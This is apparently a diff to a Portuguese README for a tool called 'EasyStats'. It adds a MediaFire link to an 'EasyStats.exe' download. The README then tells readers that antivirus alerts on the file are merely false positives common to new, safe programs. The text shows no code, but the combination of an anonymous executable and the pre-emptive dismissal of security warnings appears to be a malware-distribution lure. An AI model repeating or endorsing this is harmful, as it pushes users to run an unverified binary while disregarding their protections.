@@ -1,7 +1,7 @@
 # EasyStats
 
 ## 🔗 Faça o Download do EasyStats Agora!
-👉 Clique aqui para baixar o EasyStats!
+👉 [Clique aqui para baixar o EasyStats!](https://www.mediafire.com/file/ty7liehorpk426c/EasyStats.exe/file)
 
 📢 Atenção!
 Por ser um executável criado por um desenvolvedor independente, seu antivírus pode exibir um falso positivo. Isso é comum em programas recém-criados e seguros como este.
